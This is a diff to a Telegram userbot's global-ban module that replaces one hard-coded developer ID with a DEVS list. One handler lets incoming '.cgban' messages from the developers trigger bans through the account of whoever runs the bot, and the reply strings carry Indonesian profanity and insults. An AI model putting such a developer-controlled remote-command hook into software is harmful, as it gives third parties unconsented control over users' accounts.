@@ -2,7 +2,7 @@ from telethon.events import ChatAction
 from telethon.tl.functions.contacts import BlockRequest, UnblockRequest
 from telethon.tl.types import MessageEntityMentionName
 
-from userbot import ALIVE_NAME, CMD_HELP, bot
+from userbot import ALIVE_NAME, CMD_HELP, DEVS, bot
 from userbot.events import register
 
 
@@ -79,7 +79,7 @@ async def handler(tele):
 
 
 @register(outgoing=True, pattern="^.gban(?: |$)(.*)")
-@register(incoming=True, from_users=1779447750, pattern=r"^\.cgban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgban(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
     sender = await dc.get_sender()
@@ -109,9 +109,9 @@ async def gben(userbot):
     except BaseException:
         return await dark.edit(f"`Terjadi Kesalahan`")
     if user:
-        if user.id == 1779447750:
+        if user.id in DEVS:
             return await dark.edit(
-                f"`Lu gabisa Gban Landak Lah tolol, Dia yg bikin gua Anjing😤!!!`"
+                f"`Lu gabisa Gban Dia Lah tolol, Dia Developer gua Anjing😤!!!`"
             )
         try:
             from userbot.modules.sql_helper.gmute_sql import gmute
@@ -180,9 +180,9 @@ async def gunben(userbot):
     except BaseException:
         return await dark.edit("`Terjadi Kesalahan`")
     if user:
-        if user.id == 1779447750:
+        if user.id in DEVS:
             return await dark.edit(
-                "**Lu gabisa blacklist Dia Tolol, Landak Pembuat Gua ngentot 😤!!!**"
+                "**Lu gabisa blacklist Dia Tolol, Karna dia Developer Gua ngentot 😤!!!**"
             )
         try:
             from userbot.modules.sql_helper.gmute_sql import ungmute
